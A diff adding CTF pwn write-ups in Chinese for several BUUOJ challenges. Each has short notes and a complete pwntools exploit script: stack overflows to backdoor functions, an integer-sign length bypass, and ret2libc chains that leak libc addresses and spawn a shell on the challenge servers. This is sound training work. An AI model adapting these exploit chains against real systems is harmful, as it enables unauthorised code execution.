@@ -210,6 +210,43 @@ if __name__ == "__main__":
 
 ```
 
+### bjdctf_2020_babystack2
+
+[题目链接](https://buuoj.cn/challenges#bjdctf_2020_babystack2)
+
+<img width="1191" height="499" alt="image" src="https://github.com/user-attachments/assets/c2b811c9-da02-44e0-b504-620a7fd70cf4" />
+
+输入的第一个数不能超过 10，但是它会成为我们第二次输入的长度限制，好麻烦啊。。。
+
+🤔怎么有 `unsigned int` 强制转换，闹麻了😓
+
+第一次输入 `-1` 直接绕过了。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 26734
+io = remote(host,port)
+# io = process('./bjdctf_2020_babystack2')
+back_door = 0x400726    # backdoor	0000000000400726	
+offset = 0x18
+payload = b'A'*offset + p64(back_door)
+
+def main():
+    io.recvuntil(b"[+]Please input the length of your name:\n")
+    io.sendline(b'-1')
+    io.recvuntil(b"[+]What's u name?\n")
+    io.sendline(payload)
+    io.interactive()
+    
+
+if __name__ == "__main__":
+    main()
+```
+
 ### get_started_3dsctf_2016
 
 [题目链接](https://buuoj.cn/challenges#get_started_3dsctf_2016)
@@ -287,6 +324,43 @@ payload = b'A'*offset + p32(getsecret) + p32(printf) + p32(exit) + p32(flag)
 
 def main():
     # io.recvuntil(b"b0r4 v3r s3 7u 4h o b1ch4o m3m0...")
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+### jarvisoj_tell_me_something
+
+[题目链接](https://buuoj.cn/challenges#jarvisoj_tell_me_something)
+
+<img width="1180" height="545" alt="image" src="https://github.com/user-attachments/assets/a5762301-a7a5-41ed-9a30-0aa8f19994c5" />
+
+打开 ida 不幸地发现栈溢出就要 `0x88`（没有 `ret`，cyclic 可查），输入长度卡死 `0x100`，那么显然是不可以 ret2libc 的。
+
+更难的我不会，先找找后门函数先。
+
+<img width="1153" height="503" alt="image" src="https://github.com/user-attachments/assets/212603af-7f6e-4a40-84f1-50999e5b40c4" />
+
+可爱的后门函数藏得深了一点点，直接得到 flag。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 29933
+io = remote(host,port)
+# io = process('./guestbook')
+offset = 136
+good_game = 0x400620    # good_game	0000000000400620	
+payload = b'A'*offset + p64(good_game)
+
+
+def main():
+    io.recvuntil(b"Input your message:\n")
     io.sendline(payload)
     io.interactive()
 
@@ -420,3 +494,85 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+### 铁人三项(第五赛区)_2018_rop
+
+[题目链接](https://buuoj.cn/challenges#%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9(%E7%AC%AC%E4%BA%94%E8%B5%9B%E5%8C%BA)_2018_rop)
+
+一眼丁真，鉴定为春春的 ret2libc 😋
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 29549
+io = remote(host,port)
+# io = process('./2018_rop')
+elf = ELF('./2018_rop')
+offset = 140
+vuln_addr = 0x8048474
+write_got = elf.got['write']
+write_plt = elf.plt['write']
+payload_1 = b'A'*offset + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(write_got) + p32(4)
+
+
+def main():
+    io.sendline(payload_1)
+    leak_data = io.recvn(4)
+    write_addr = u32(leak_data)
+    print(hex(write_addr))  # 0xf7e936f0
+    libc = write_addr - 0xe56f0
+    system = libc + 0x3cd10
+    binsh = libc + 0x17b8cf
+    payload_2 = b'A'*offset + p32(system) + p32(114514) + p32(binsh)
+    io.sendline(payload_2)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+### bjdctf_2020_babyrop
+
+[题目链接](https://buuoj.cn/challenges#bjdctf_2020_babyrop)
+
+依旧普普通通 ret2libc。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'amd64',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 28493
+io = remote(host,port)
+# io = process('./bjdctf_2020_babyrop')
+elf = ELF('./bjdctf_2020_babyrop')
+offset = 0x28
+vuln_addr = 0x40067d
+pop_rdi_ret = 0x400733
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+payload_1 = b'A'*offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)
+
+def main():
+    io.recvuntil("Pull up your sword and tell me u story!\n")
+    io.sendline(payload_1)
+    puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+    # puts_addr = u64(leak_data)
+    # # leak_data = io.recvn(8)
+    print(hex(puts_addr))   # 0x7fd070fdf690 → libc6_2.23-0ubuntu11_amd64
+    libc = puts_addr - 0x6f690
+    system = libc + 0x45390
+    binsh = libc + 0x18cd57
+    payload_2 = b'A'*offset + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(114514)
+    io.sendline(payload_2)
+    io.interactive()
+    
+
+if __name__ == "__main__":
+    main()
+```
+
